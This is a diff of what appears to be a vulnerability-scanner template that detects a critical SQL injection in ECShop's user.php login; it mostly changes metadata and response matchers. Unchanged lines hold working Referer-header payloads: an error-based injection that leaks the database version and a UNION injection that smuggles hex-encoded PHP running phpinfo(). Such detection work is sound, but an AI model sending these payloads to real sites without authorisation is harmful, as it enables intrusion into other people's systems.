@@ -15,13 +15,10 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
     cwe-id: CWE-89
-    cpe: cpe:2.3:a:shopex:ecshop:*:*:*:*:*:*:*:*
   metadata:
     verified: true
     max-request: 2
     fofa-query: app="ECShop"
-    product: ecshop
-    vendor: shopex
   tags: sqli,php,ecshop
 
 http:
@@ -31,7 +28,6 @@ http:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
-
       - |
         GET /user.php?act=login HTTP/1.1
         Host: {{Hostname}}
@@ -39,11 +35,21 @@ http:
         Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
 
     stop-at-first-match: true
+
+    matchers-condition: or
     matchers:
       - type: word
         words:
+          - 'XPATH syntax error:'
           - '[error] =>'
           - '[0] => Array'
           - 'MySQL server error report:Array'
         condition: and
-# digest: 4a0a0047304502206ae19ddacb5cd0a11d11d3cb8793d7121c5d0d7f5c8ad8ceea78984d1e3d21af022100ea16e46aa1a4b2e740c7bf702abeb7d45a7084a89415042de640ee29a07f7d0c:922c64590222798bb761d5b6d8e72950
+
+      - type: word
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+
+# digest: 490a0046304402205603261eadaae4dcead3ac6958deb41a24aecb61579b6dc4076cec16e6f98af90220431258efa9d9af670dabc223b8eb71a0c8f124737fdcdea42e98c1a07293586f:922c64590222798bb761d5b6d8e72950
